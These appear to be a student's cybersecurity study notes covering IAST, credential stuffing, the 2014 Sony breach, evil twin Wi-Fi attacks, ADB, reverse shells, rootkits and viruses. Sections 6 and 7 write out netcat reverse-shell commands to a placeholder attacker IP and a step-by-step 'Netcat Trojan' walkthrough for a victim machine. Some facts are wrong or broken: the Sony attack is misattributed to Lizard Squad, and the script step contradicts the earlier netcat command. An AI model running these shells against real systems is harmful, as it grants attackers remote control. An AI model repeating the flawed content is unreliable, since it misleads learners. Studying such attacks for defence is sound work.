### 1. **IAST (Interactive Application Security Testing) in regard to SAST and DAST**

**IAST** is a hybrid approach combining elements of both **SAST (Static Application Security Testing)** and **DAST (Dynamic Application Security Testing)**.

- **SAST** analyzes the source code or binaries of an application to identify vulnerabilities without executing the application, often used during development.
- **DAST** tests the application in a running state (black-box testing), identifying issues such as SQL injection, cross-site scripting, and other runtime vulnerabilities.

**IAST** integrates into the testing environment to analyze the application during runtime (like DAST) but uses source code analysis (like SAST) for deeper insights. It provides real-time feedback to developers while the application is being tested, offering a more comprehensive vulnerability detection method.

### 2. **Credential Stuffing**

**Credential stuffing** is a type of cyberattack where attackers use previously stolen username and password pairs (often from data breaches) to gain unauthorized access to user accounts on different websites or services.

- This attack works under the assumption that many users reuse passwords across multiple sites.
- **Preventive Measures**: Implementing multi-factor authentication (MFA), rate limiting, and CAPTCHA can help prevent these attacks.

### 3. **Sony Cyber Attack 2014**

The **Sony Cyber Attack (2014)**, attributed to the **Lizard Squad** hacking group, caused significant disruption:

- Hackers breached Sony’s servers, stole sensitive data, and leaked movies and private emails.
- They also disrupted services like PlayStation Network and Sony Entertainment.
- **Torrents**: Movies that were supposed to be released in theaters were leaked online due to the breach.
- The incident highlighted poor security practices, including storing sensitive information like usernames and passwords in **plain text**, which made the breach much easier for attackers to exploit.

### 4. **Evil Twin Attack**

An **Evil Twin Attack** is a type of **Wi-Fi spoofing** attack where a rogue Wi-Fi access point (AP) is set up to mimic a legitimate Wi-Fi network.

- Attackers create a fake AP with the same SSID (network name) as a trusted one. Users unknowingly connect to this fake AP, allowing attackers to intercept sensitive data.
- This attack can be used for **man-in-the-middle (MITM)** attacks to steal data, inject malware, or monitor communications.

### 5. **`sudo apt install adb` Steps**

To install **Android Debug Bridge (ADB)** on an Ubuntu-based system:

1. Open the terminal.
2. Update your package list:
    
    ```bash
    sudo apt update
    ```
    
3. Install ADB by running:
    
    ```bash
    sudo apt install adb
    ```
    
4. Once installed, you can check the installation by typing:
    
    ```bash
    adb version
    ```
    
5. To use ADB, ensure **USB debugging** is enabled on your Android device and connect it via USB.
6. You can then use various ADB commands like:
    
    ```bash
    adb devices
    adb shell
    adb push <local file> <remote path>
    ```

### 6. **Reverse Shell (Android, Windows, Linux)**

A **reverse shell** is a type of shell in which the target machine opens a connection to an attacking machine, allowing the attacker to run commands on the target.

- **Android Reverse Shell:** Using `adb` and a reverse shell payload can give the attacker control over an Android device.
- **Windows Reverse Shell:** A command like `nc -e cmd.exe <attacker_ip> <port>` can create a reverse shell on a Windows machine.
- **Linux Reverse Shell:** Using `nc -e /bin/bash <attacker_ip> <port>` on a Linux machine allows an attacker to control it remotely.

---

### 7. **Netcat Trojan**

A **Netcat Trojan** is a malicious program using **Netcat** for creating a reverse shell or establishing backdoor communication channels.

- **Prerequisites:**
    - Install **Netcat** (`sudo apt install netcat`).
    - Ensure **firewalls** allow the relevant ports.
- **Netcat Command**:
    - On the attacker's machine, listen on a specific port:
        
        ```bash
        sudo nc -lvp 5000
        ```
        
    - On the victim's machine, initiate the reverse shell:
        
        ```bash
        sudo nc -e /bin/bash <attacker_ip> 5000
        ```
        

**Remaining Steps after `chmod u+x myfile.sh`:**

1. Create a script file (`myfile.sh`), add the reverse shell Netcat command to it:
    
    ```bash
    netcat <attacker_ip> 5000
    ```
    
2. Set it to be executable:
    
    ```bash
    chmod u+x myfile.sh
    ```
    
3. Run the script on the victim machine:
    
    ```bash
    ./myfile.sh
    ```
    
4. The attacker should now have a reverse shell connection.

### 8. **Process Explorer Tool**

**Process Explorer** is a tool from Sysinternals used to monitor the processes running on a Windows machine.

- It shows detailed information about processes, threads, and handles.
- **Key Features:**
    - Displays which processes are using specific files or libraries.
    - Allows identifying malicious processes by highlighting suspicious activity.

---

### 9. **IPv4 Header**

The **IPv4 header** is part of every IPv4 packet, containing essential routing and delivery information.

- Key fields include:
    - **Version**: Protocol version (4 for IPv4).
    - **IHL**: Internet Header Length (length of the header in 32-bit words).
    - **Total Length**: Entire packet length (header + data).
    - **Protocol**: Protocol used in the payload (TCP, UDP, etc.).
    - **Source Address** and **Destination Address**: IP addresses of the sender and receiver.

---

### 10. **HTTP Tunneling**

**HTTP Tunneling** involves encapsulating other protocols within HTTP to bypass firewalls or network restrictions.

- Can be used to tunnel **TCP** traffic over **HTTP**.
- **Overt Channels**: Open, observable communication (e.g., HTTP itself).
- **Covert Channels**: Hidden, less detectable communication.

---

### 11. **Trojans and RATs**

- **Trojan**: Malicious software disguised as legitimate software to gain unauthorized access.
- **Remote Access Trojans (RATs)**: Provide the attacker with control over the victim's machine, allowing for spying, file access, and more.

---

### 12. **Rootkit Techniques**

**Rootkits** are designed to hide the presence of malicious software or processes from detection.

- Common methods include manipulating system calls, hiding files, and disguising processes.
- Rootkits can give attackers persistent control over a system.

---

### 13. **Virus and Spread Mechanism**

- **Virus**: Malicious code that replicates by attaching itself to other files or programs.
- **Spread Mechanism**: Typically spreads via email, file sharing, or infected software downloads.
- **Examples**:
    - **Conficker**: A self-replicating worm targeting Windows systems.
    - **Blaster**: A worm that exploited vulnerabilities in Windows.
    - **ILOVEYOU**: A virus spread via email attachment.
